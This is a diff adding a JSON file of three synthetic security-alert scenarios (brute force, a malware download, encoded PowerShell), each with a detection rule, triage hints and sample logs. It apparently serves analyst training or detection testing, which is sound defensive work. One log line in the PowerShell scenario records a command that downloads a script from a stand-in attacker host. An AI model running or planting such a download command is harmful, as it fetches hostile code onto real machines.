@@ -1,0 +1,188 @@
+[
+  {
+    "alert_id": "A-1001",
+    "name": "Multiple Failed Logins",
+    "severity": "High",
+    "mitre": "T1110 - Brute Force",
+    "kill_chain_phase": "Reconnaissance",
+    "description": "More than five failed login attempts were observed against the same user within two minutes.",
+    "rule": "IF failed_logins > 5 in 2 minutes THEN trigger high-severity brute force alert",
+    "hints": [
+      "Check source IP reputation and geolocation.",
+      "Verify whether the target user normally logs in from this network.",
+      "Look for successful login immediately after the failed attempts.",
+      "Review authentication logs for password spraying against other users."
+    ],
+    "logs": [
+      {
+        "timestamp": "2026-05-02T09:13:05+08:00",
+        "source_ip": "203.0.113.45",
+        "destination_ip": "10.20.1.14",
+        "user": "jdelacruz",
+        "action": "login_attempt",
+        "status": "failed",
+        "raw_log": "auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password"
+      },
+      {
+        "timestamp": "2026-05-02T09:13:22+08:00",
+        "source_ip": "203.0.113.45",
+        "destination_ip": "10.20.1.14",
+        "user": "jdelacruz",
+        "action": "login_attempt",
+        "status": "failed",
+        "raw_log": "auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password"
+      },
+      {
+        "timestamp": "2026-05-02T09:13:39+08:00",
+        "source_ip": "203.0.113.45",
+        "destination_ip": "10.20.1.14",
+        "user": "jdelacruz",
+        "action": "login_attempt",
+        "status": "failed",
+        "raw_log": "auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password"
+      },
+      {
+        "timestamp": "2026-05-02T09:14:01+08:00",
+        "source_ip": "203.0.113.45",
+        "destination_ip": "10.20.1.14",
+        "user": "jdelacruz",
+        "action": "login_attempt",
+        "status": "failed",
+        "raw_log": "auth gw01 src=203.0.113.45 dst=10.20.1.14 user=jdelacruz action=login_attempt status=failed reason=bad_password"
+      },
+      {
+        "timestamp": "2026-05-02T09:14:42+08:00",
+        "source_ip": "203.0.113.45",
+        "destination_ip": "10.20.1.14",
+        "user": "jdelacruz",
+        "action": "threshold_exceeded",
+        "status": "alerted",
+        "raw_log": "rule=multiple_failed_logins count=8 window=120s user=jdelacruz src=203.0.113.45 severity=high"
+      }
+    ]
+  },
+  {
+    "alert_id": "A-1002",
+    "name": "Malicious File Download",
+    "severity": "High",
+    "mitre": "T1204 - User Execution",
+    "kill_chain_phase": "Delivery",
+    "description": "A downloaded file hash matched a threat intelligence indicator for known malware.",
+    "rule": "IF file_hash matches threat intel THEN trigger high-severity malware delivery alert",
+    "hints": [
+      "Confirm the hash against current threat intelligence.",
+      "Identify the user and browser process that initiated the download.",
+      "Check whether the file executed or spawned child processes.",
+      "Inspect proxy, EDR, and DNS logs for related indicators."
+    ],
+    "logs": [
+      {
+        "timestamp": "2026-05-02T10:21:11+08:00",
+        "source_ip": "10.20.8.55",
+        "destination_ip": "198.51.100.77",
+        "user": "msantos",
+        "action": "http_download",
+        "status": "completed",
+        "raw_log": "proxy src=10.20.8.55 dst=198.51.100.77 user=msantos url=/invoice_review.exe bytes=7340032"
+      },
+      {
+        "timestamp": "2026-05-02T10:21:18+08:00",
+        "source_ip": "10.20.8.55",
+        "destination_ip": "10.20.8.55",
+        "user": "msantos",
+        "action": "file_write",
+        "status": "success",
+        "raw_log": "edr host=FIN-LT-044 path=C:\\Users\\msantos\\Downloads\\invoice_review.exe sha256=5f2a9d1b7c4e8a0030d9badf00d1234567890abcdef"
+      },
+      {
+        "timestamp": "2026-05-02T10:21:26+08:00",
+        "source_ip": "10.20.8.55",
+        "destination_ip": "ti.local",
+        "user": "msantos",
+        "action": "hash_lookup",
+        "status": "malicious_match",
+        "raw_log": "ti_lookup sha256=5f2a9d1b7c4e8a0030d9badf00d1234567890abcdef verdict=malware family=loader"
+      },
+      {
+        "timestamp": "2026-05-02T10:21:41+08:00",
+        "source_ip": "10.20.8.55",
+        "destination_ip": "10.20.8.55",
+        "user": "msantos",
+        "action": "process_start",
+        "status": "blocked",
+        "raw_log": "edr host=FIN-LT-044 process=invoice_review.exe action=blocked policy=malware_prevention"
+      },
+      {
+        "timestamp": "2026-05-02T10:22:03+08:00",
+        "source_ip": "10.20.8.55",
+        "destination_ip": "198.51.100.77",
+        "user": "msantos",
+        "action": "alert_triggered",
+        "status": "true",
+        "raw_log": "rule=malicious_file_download host=FIN-LT-044 sha256=5f2a9d1b7c4e8a0030d9badf00d1234567890abcdef severity=high"
+      }
+    ]
+  },
+  {
+    "alert_id": "A-1003",
+    "name": "Suspicious PowerShell Execution",
+    "severity": "Medium",
+    "mitre": "T1059 - Command and Scripting Interpreter",
+    "kill_chain_phase": "Exploitation",
+    "description": "Base64 encoded PowerShell execution was detected on an endpoint.",
+    "rule": "IF base64 encoded PowerShell detected THEN trigger medium-severity script execution alert",
+    "hints": [
+      "Decode the PowerShell command and identify its intent.",
+      "Check parent process and whether the user launched it interactively.",
+      "Look for outbound network connections after execution.",
+      "Search for lateral movement or credential access on the endpoint."
+    ],
+    "logs": [
+      {
+        "timestamp": "2026-05-02T11:04:10+08:00",
+        "source_ip": "10.20.12.30",
+        "destination_ip": "10.20.12.30",
+        "user": "admin",
+        "action": "process_start",
+        "status": "success",
+        "raw_log": "edr host=OPS-WS-019 parent=winword.exe process=powershell.exe args=-NoP -EncodedCommand SQBFAFgA"
+      },
+      {
+        "timestamp": "2026-05-02T11:04:15+08:00",
+        "source_ip": "10.20.12.30",
+        "destination_ip": "10.20.12.30",
+        "user": "admin",
+        "action": "script_decode",
+        "status": "suspicious",
+        "raw_log": "scriptblock decoded=\"Invoke-WebRequest -Uri hxxp://203.0.113.90/a.ps1 -OutFile $env:TEMP\\a.ps1\""
+      },
+      {
+        "timestamp": "2026-05-02T11:04:19+08:00",
+        "source_ip": "10.20.12.30",
+        "destination_ip": "203.0.113.90",
+        "user": "admin",
+        "action": "outbound_connection",
+        "status": "success",
+        "raw_log": "netflow src=10.20.12.30 dst=203.0.113.90 dport=443 process=powershell.exe"
+      },
+      {
+        "timestamp": "2026-05-02T11:04:25+08:00",
+        "source_ip": "10.20.12.30",
+        "destination_ip": "10.20.40.12",
+        "user": "admin",
+        "action": "remote_admin_probe",
+        "status": "attempted",
+        "raw_log": "windows event=network_logon_attempt src=10.20.12.30 dst=10.20.40.12 user=admin status=failed"
+      },
+      {
+        "timestamp": "2026-05-02T11:04:34+08:00",
+        "source_ip": "10.20.12.30",
+        "destination_ip": "10.20.12.30",
+        "user": "admin",
+        "action": "alert_triggered",
+        "status": "true",
+        "raw_log": "rule=suspicious_powershell_execution host=OPS-WS-019 encoded_command=true severity=medium"
+      }
+    ]
+  }
+]
